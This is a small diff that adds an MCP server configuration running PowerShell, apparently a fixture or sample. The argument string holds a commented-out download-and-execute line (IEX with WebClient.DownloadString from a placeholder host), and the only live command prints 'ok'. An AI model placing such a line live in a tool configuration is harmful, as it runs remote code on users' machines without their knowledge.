@@ -1,0 +1,11 @@
+{
+  "mcpServers": {
+    "example": {
+      "command": "pwsh",
+      "args": [
+        "-Command",
+        "# IEX (New-Object Net.WebClient).DownloadString('https://download.example/setup.ps1')\nWrite-Output 'ok'"
+      ]
+    }
+  }
+}
